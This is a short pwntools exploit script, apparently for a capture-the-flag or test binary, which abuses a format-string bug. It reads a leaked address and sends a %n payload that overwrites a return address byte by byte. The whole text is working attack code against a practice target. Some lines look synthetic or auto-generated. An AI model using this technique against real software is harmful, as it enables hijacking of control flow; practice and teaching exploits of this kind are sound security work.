from pwn import *

import time

import sys

target = process("./chall-test_fmtString-19-x86")
gdb.attach(target, gdbscript="verify_exploit")

target.recvuntil("Tell me I was never good enough: ")
leak = int(target.recvline().strip("\n"), 16)
print "target address is: " + hex(leak)

retAddress = leak + 53
inputAddress = leak - (53 - 53)
# Declare our addresses
address = retAddress
address0 = p32(address + 0)
address1 = p32(address + 1)
address2 = p32(address + 2)

# The value we are trying to write
value = 0x80491f6

# The print value size, to control the value being written
print0 = "%233x"
print1 = "%155x"
print2 = "%1651x"

# Specify the offset to the address, and write to it
write0 = "%6$n"
write1 = "%7$n"
write2 = "%8$n"

# Form the payload
payload = ""
payload = "0"
payload += address0
payload += address1
payload += address2
payload += print0
payload += write0
payload += print1
payload += write1
payload += print2
payload += write2

# Send the fmt string payload
target.sendline(payload)
target.recvall(timeout = 2)

time.sleep(2)
